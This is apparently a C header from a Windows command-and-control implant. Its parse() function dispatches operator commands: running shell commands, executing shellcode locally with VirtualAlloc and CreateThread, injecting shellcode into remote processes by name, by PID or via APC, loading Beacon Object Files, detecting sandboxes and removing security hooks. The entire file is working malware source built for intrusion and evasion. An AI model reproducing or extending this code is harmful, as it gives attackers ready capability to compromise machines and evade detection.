#ifndef COMMANDS_INCLUDED
#define COMMANDS_INCLUDED
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "datatypes.h"
#include "utils/winexec.h"
#include "hackmods/sandbox.h"
#include "hackmods/injectors.h"
#include "hackmods/bof.h"
#include "hackmods/unhook.h"
#define pstr(x) printf("len=%d, data=%.*s\n", x.len, x.len, x.data)
#define fs(x) free(x.data)

enum Opcodes{
    PRINT, //1//print [text]
    MSGBOX, //2//msgbox [title] [content]
    POPINT, //0
    POPSTR, //0
    CONSUME, //0
    EXEC, //r1//exec [command]
    EXIT, //0
    SLEEP, //1//sleep [time, ms]
    LOCAL_SHC, //1//local_shc [shellcode]
    LOCAL_SHC_RWX, //1//local_shc_rwx [shellcode]
    SANDBOX, //r0//detects sandbox
    REMOTE_SHC_PNAME, //3//remote_shc_pname [processname] [shellcode] [use rwx]
    REMOTE_SHC_PID, //3//remote_shc_pid [pid] [shellcode] [use rwx]
    SHC_INJECT_APC, //3//shc_inject_apc [processname] [shellcode] [use rwx]
    BOF_EXECUTE, //1//bof_execute file([bof file])
    SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
    UNHOOK //0//auto remove hooks
};

int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
    if(mnem == MSGBOX){
        String title = popstr(sp);
        String body = popstr(sp);
        MessageBoxA(NULL, body.data, title.data, MB_OK);
        fs(title);
        fs(body);
    }else if(mnem == CONSUME){
        String str = popstr(sp);
        fs(str);
    }else if(mnem == EXEC){
        String in = popstr(sp);
        String out;
        out.data = calloc(10000, 1);
        out.len = exec(in.data, out.data, in.len);
        pushstr(out, sp);
    }else if(mnem == SLEEP){
        Sleep(popint(sp));
    }else if(mnem == LOCAL_SHC){
        String shc = popstr(sp);
        void *exec = VirtualAlloc(0, shc.len, MEM_COMMIT, PAGE_READWRITE);
        memcpy(exec, shc.data, shc.len);
        DWORD old;
        VirtualProtect(exec, shc.len, PAGE_EXECUTE_READ, &old);
        CreateThread(NULL, 0, exec, NULL, 0, NULL);
    }else if (mnem == LOCAL_SHC_RWX){
        String shc = popstr(sp);
        void *exec = VirtualAlloc(0, shc.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shc.data, shc.len);
        CreateThread(NULL, 0, exec, NULL, 0, NULL);
    }else if(mnem == SANDBOX){
        String out;
        out.data = calloc(500, 1);
        sanddetect(out.data);
        out.len = strlen(out.data);
        pushstr(out, sp);
    }else if(mnem == REMOTE_SHC_PNAME){
        String name = popstr(sp);
        String shc = popstr(sp);
        injectProcess(name.data, shc.data, shc.len, popint(sp));
        fs(name);
        fs(shc);
    }else if(mnem == REMOTE_SHC_PID){
        int pid = popint(sp);
        String shc = popstr(sp);
        injectPid(pid, shc.data, shc.len, popint(sp));
        fs(shc);
    }else if(mnem == SHC_INJECT_APC){
        String name = popstr(sp);
        String shc = popstr(sp);
        injectAPC(name.data, shc.data, shc.len, popint(sp));
        fs(name);
        fs(shc);
    }else if(mnem == BOF_EXECUTE){
        String data = popstr(sp);
        loadBOF(data.data, data.len, conn);
    }else if(mnem == UNHOOK){
        unhook();
    }else{
        return 1;
    }
    return 0;
}
#endif